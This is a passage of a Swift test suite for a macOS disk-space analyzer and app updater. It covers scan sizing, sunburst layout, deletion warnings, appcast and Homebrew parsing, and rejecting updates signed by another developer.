        try fm.createDirectory(at: root.appending(path: "empty"), withIntermediateDirectories: true)
        try Data(count: 400_000).write(to: root.appending(path: "big/inner/video.mov"))
        try Data(count: 100_000).write(to: root.appending(path: "big/notes.txt"))
        for i in 0..<20 { try Data(count: 5_000 + i * 10).write(to: root.appending(path: "many/f\(i).bin")) }
        // A hard link to the video: same data, must be counted once.
        try fm.linkItem(at: root.appending(path: "big/inner/video.mov"), to: root.appending(path: "many/video-link.mov"))
        try fm.createSymbolicLink(at: root.appending(path: "loop"), withDestinationURL: root) // never followed
        return root
    }

    @Test func scansSizesLikeTheDisk() async throws {
        let root = try makeTree()
        defer { try? FileManager.default.removeItem(at: root) }
        let scanner = SpaceScanner()
        let tree = await scanner.scan(root.path)
        let big = try #require(tree.children.first { $0.name == "big" })
        let notes = try #require(big.children.first { $0.name == "notes.txt" })
        #expect(notes.size >= 100_000) // allocated size, rounded up to blocks
        #expect(notes.path == root.appending(path: "big/notes.txt").path)
        #expect(big.size == big.children.reduce(0) { $0 + $1.size })
        #expect(tree.size == tree.children.reduce(0) { $0 + $1.size })
        // Empty folders and symlinks don't appear.
        #expect(!tree.children.contains { $0.name == "empty" || $0.name == "loop" })
        #expect(tree.children.first === tree.children.max { $0.size < $1.size }) // sorted biggest first
        #expect(scanner.filesScanned.load(ordering: .relaxed) == 23)
    }

    @Test func hardLinksCountOnceAndSmallFilesAreGrouped() async throws {
        let root = try makeTree()
        defer { try? FileManager.default.removeItem(at: root) }
        let tree = await SpaceScanner().scan(root.path)
        let many = try #require(tree.children.first { $0.name == "many" })
        // 21 files: the 12 largest listed, the rest summed. (The hard-linked video counts as zero
        // here if its other name was reached first, which can drop it from the list.)
        let grouped = try #require(many.children.first { if case .smallFiles = $0.kind { true } else { false } })
        if case .smallFiles(let count) = grouped.kind { #expect(count == 9) }
        #expect(many.fileCount == 21)
        // The hard-linked video (400 KB) is counted in one place only.
        #expect(tree.size >= 400_000 + 100_000 + 20 * 5_000)
        #expect(tree.size < 2 * 400_000 + 100_000 + 20 * 5_200 + 200_000)
    }

    @Test func unreadableFoldersAreMarked() async {
        let tree = await SpaceScanner().scan("/private/var/db/sudo") // root-only
        #expect(tree.isUnreadable || tree.children.isEmpty)
    }

    private func sample() -> SpaceNode {
        let root = SpaceNode(name: "root", kind: .folder, size: 100, fileCount: 3, rootPath: "/r")
        let a = SpaceNode(name: "a", kind: .folder, size: 75, fileCount: 2)
        let a1 = SpaceNode(name: "a1", kind: .file, size: 50, fileCount: 1)
        let a2 = SpaceNode(name: "a2", kind: .file, size: 25, fileCount: 1)
        let b = SpaceNode(name: "b", kind: .file, size: 25, fileCount: 1)
        a.children = [a1, a2]; a1.parent = a; a2.parent = a
        root.children = [a, b]; a.parent = root; b.parent = root
        return root
    }

    @Test func layoutGivesEachItemItsShareOfTheTurn() {
        let root = sample()
        let segments = Sunburst.layout(root)
        #expect(segments.count == 4)
        let a = segments.first { $0.node.name == "a" }!
        #expect(a.depth == 1 && a.start == 0 && abs(a.end - 0.75) < 1e-9)
        let a2 = segments.first { $0.node.name == "a2" }!
        #expect(a2.depth == 2 && abs(a2.start - 0.5) < 1e-9 && abs(a2.end - 0.75) < 1e-9)
        #expect(a2.branch == a.branch) // same color family as its folder
        #expect(segments.first { $0.node.name == "b" }!.branch != a.branch)
    }

    @Test func hitTestingFindsTheSliceUnderThePointer() {
        let root = sample()
        let segments = Sunburst.layout(root)
        let geometry = Sunburst.Geometry(radius: 100, rings: 3)
        let ring1 = (geometry.inner(1) + geometry.outer(1)) / 2
        let ring2 = (geometry.inner(2) + geometry.outer(2)) / 2
        // 3 o'clock is 25% of the way round: inside "a" (0–75%).
        #expect(Sunburst.hit(CGPoint(x: ring1, y: 0), in: segments, geometry: geometry)?.node.name == "a")
        // 9 o'clock (75%) on the first ring is where "b" starts.
        #expect(Sunburst.hit(CGPoint(x: -ring1, y: -0.01), in: segments, geometry: geometry)?.node.name == "b")
        // 6 o'clock (50%) on the second ring: "a2" starts at 50%.
        #expect(Sunburst.hit(CGPoint(x: -0.01, y: ring2), in: segments, geometry: geometry)?.node.name == "a2")
        #expect(Sunburst.hit(.zero, in: segments, geometry: geometry) == nil) // the center disc
        #expect(abs(Sunburst.turnFraction(CGPoint(x: 0, y: -1))) < 1e-9) // 12 o'clock
    }

    @Test func removingAnItemUpdatesEveryParent() {
        let root = sample()
        let a = root.children[0]
        let a1 = a.children[0]
        a.remove(a1)
        #expect(a.size == 25 && root.size == 50)
        #expect(root.fileCount == 2)
        #expect(root.isAncestor(of: a.children[0]))
        #expect(a.children[0].lineage.map(\.name) == ["root", "a", "a2"])
    }

    @Test func cautionsBeforeRemovingRiskyThings() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        #expect(SpaceLensModel.caution(for: "/System/Library") != nil)
        #expect(SpaceLensModel.caution(for: "/Applications/Foo.app")?.contains("Uninstaller") == true)
        #expect(SpaceLensModel.caution(for: home + "/Library/Caches/x")?.contains("Library") == true)
        #expect(SpaceLensModel.caution(for: home + "/Movies/old.mov") == nil)
    }
}

@Suite("Updates")
struct UpdateTests {
    @Test func comparesVersionsLikeSparkle() {
        #expect(VersionComparator.isNewer("1.10", than: "1.9"))
        #expect(VersionComparator.isNewer("2.0", than: "2.0b3"))
        #expect(VersionComparator.isNewer("2.0b3", than: "2.0b2"))
        #expect(VersionComparator.isNewer("1.0.1", than: "1.0"))
        #expect(VersionComparator.compare("1.2", "1.2.0") == 0)
        #expect(!VersionComparator.isNewer("1.164.0", than: "1.166.0"))
        #expect(VersionComparator.isNewer("87668", than: "86805"))
        #expect(VersionComparator.isNewer("26149.1804.4788.5681", than: "26149.1804.4788.5680"))
    }

    private let feed = """
    <?xml version="1.0" encoding="utf-8"?>
    <rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
    <channel>
      <item>
        <title>3.0 beta</title>
        <sparkle:channel>beta</sparkle:channel>
        <sparkle:version>300</sparkle:version>
        <enclosure url="https://example.com/app-3.0b.zip" length="1"/>
      </item>
      <item>
        <title>2.5</title>
        <sparkle:version>250</sparkle:version>
        <sparkle:shortVersionString>2.5</sparkle:shortVersionString>
        <sparkle:minimumSystemVersion>99.0</sparkle:minimumSystemVersion>
        <enclosure url="https://example.com/app-2.5.zip" length="10"/>
      </item>
      <item>
        <title>2.1</title>
        <pubDate>Wed, 16 Sep 2026 10:00:00 +0000</pubDate>
        <sparkle:criticalUpdate/>
        <sparkle:releaseNotesLink>https://example.com/notes</sparkle:releaseNotesLink>
        <description><![CDATA[<h2>New</h2><ul><li>Faster &amp; smaller</li><li>Fixes</li></ul>]]></description>
        <enclosure url="https://example.com/app-2.1.zip" sparkle:version="210" sparkle:shortVersionString="2.1" length="12345"/>
        <sparkle:deltas>
          <enclosure url="https://example.com/delta.delta" sparkle:version="210" sparkle:deltaFrom="200"/>
        </sparkle:deltas>
      </item>
    </channel>
    </rss>
    """

    private func app(version: String, build: String?) -> UpdatableApp {
        UpdatableApp(path: "/Applications/Example.app", name: "Example", bundleID: "com.example", version: version,
                     build: build, teamID: "ABCDE12345", source: .sparkle(feed: URL(string: "https://example.com/appcast.xml")!))
    }

    @Test func parsesAppcasts() {
        let items = AppcastParser.parse(Data(feed.utf8))
        #expect(items.count == 3)
        let item = items[2]
        #expect(item.version == "210" && item.shortVersion == "2.1")
        #expect(item.downloadURL?.lastPathComponent == "app-2.1.zip") // not the delta
        #expect(item.length == 12345)
        #expect(item.isCritical)
        #expect(item.releaseNotesURL?.absoluteString == "https://example.com/notes")
        #expect(item.pubDate != nil)
        #expect(Appcast.plainText(fromHTML: item.notesHTML ?? "") == "New\n• Faster & smaller\n• Fixes")
    }

    @Test func picksTheNewestReleaseThisMacCanRun() {
        let items = AppcastParser.parse(Data(feed.utf8))
        let (best, needsNewer) = Appcast.best(items, osVersion: "26.0")
        #expect(best?.shortVersion == "2.1") // beta skipped, 2.5 needs macOS 99
        #expect(needsNewer == "99.0")

        let available = UpdateSources.evaluate(app(version: "2.0", build: "200"), items: items, osVersion: "26.0")
        #expect(available.status == .available)
        #expect(available.latestVersion == "2.1")
        #expect(available.isCritical)
        #expect(available.size == 12345)

        let current = UpdateSources.evaluate(app(version: "2.1", build: "210"), items: items, osVersion: "26.0")
        #expect(current.status == .needsNewerMacOS("99.0"))

        let future = UpdateSources.evaluate(app(version: "2.1", build: "210"), items: items, osVersion: "99.1")
        #expect(future.status == .available)
        #expect(future.latestVersion == "2.5")
    }

    @Test func readsAppStoreAnswers() {
        let apps = [
            UpdatableApp(path: "/A.app", name: "A", bundleID: "com.a", version: "1.0", build: nil, teamID: nil, source: .appStore),
            UpdatableApp(path: "/B.app", name: "B", bundleID: "com.b", version: "4.0.3", build: nil, teamID: nil, source: .appStore),
            UpdatableApp(path: "/C.app", name: "C", bundleID: "com.c", version: "1.0", build: nil, teamID: nil, source: .appStore),
        ]
        let results: [[String: Any]] = [
            ["bundleId": "com.a", "version": "1.2", "trackViewUrl": "https://apps.apple.com/us/app/a/id1", "releaseNotes": "Bug fixes"],
            ["bundleId": "com.b", "version": "1.5.3"], // store lags behind: not an update
        ]
        let checks = UpdateSources.evaluateAppStore(apps, results: results)
        #expect(checks["/A.app"]?.status == .available)
        #expect(checks["/A.app"]?.storeURL?.scheme == "macappstore")
        #expect(checks["/A.app"]?.notes == "Bug fixes")
        #expect(checks["/B.app"]?.status == .upToDate)
        #expect(checks["/B.app"]?.latestVersion == "4.0.3")
        #expect(checks["/C.app"]?.status == .notCheckable)
    }

    @Test func homebrewRecordsAreTrustedOnlyWhenTheyMatchTheApp() {
        let json: [String: Any] = ["casks": [[
            "token": "android-studio", "version": "2026.1.4.7,quail4",
            "installed": "2026.1.2.10,quail2,AI-261.25134", "auto_updates": true,
            "artifacts": [["app": ["Android Studio.app"], "target": "/Applications/Android Studio.app"]],
        ]]]
        let casks = UpdateSources.parseBrewCasks(json)
        let cask = casks["Android Studio.app"]!
        #expect(cask.token == "android-studio" && cask.displayLatest == "2026.1.4.7")
        let matching = UpdatableApp(path: "/Applications/Android Studio.app", name: "Android Studio", bundleID: nil, version: "2026.1",
                                    build: "AI-261.25134", teamID: nil, source: .homebrew(token: "android-studio"))
        #expect(UpdateSources.evaluateBrew(matching, cask: cask).status == .available)
        // The app updated itself past Homebrew's record: don't claim an update.
        let ahead = UpdatableApp(path: matching.path, name: matching.name, bundleID: nil, version: "2026.1",
                                 build: "AI-999.1", teamID: nil, source: matching.source)
        #expect(UpdateSources.evaluateBrew(ahead, cask: cask).status == .notCheckable)
    }

    @Test func recognizesDownloadFormats() {
        #expect(UpdateInstaller.archiveKind("Arc-1.166.0-87668.zip") == "zip")
        #expect(UpdateInstaller.archiveKind("App.dmg") == "dmg")
        #expect(UpdateInstaller.archiveKind("app.tar.xz") == "tar")
        #expect(UpdateInstaller.archiveKind("Installer.pkg") == "pkg")
        #expect(UpdateInstaller.archiveKind("weird.bin") == nil)
    }

    @Test func refusesUpdatesFromAnotherDeveloper() {
        // Calculator is signed by Apple, not by team ABCDE12345.
        let installed = app(version: "0.1", build: "1")
        #expect(throws: UpdateInstaller.Failure.wrongDeveloper) {
            try UpdateInstaller.verify(URL(fileURLWithPath: "/System/Applications/Calculator.app"), replacing: installed)
        }
        let unsigned = UpdatableApp(path: "/x.app", name: "X", bundleID: nil, version: "1", build: nil, teamID: nil, source: .unknown)
        #expect(throws: UpdateInstaller.Failure.cantVerifyInstalled) {
            try UpdateInstaller.verify(URL(fileURLWithPath: "/System/Applications/Calculator.app"), replacing: unsigned)
        }
    }
}
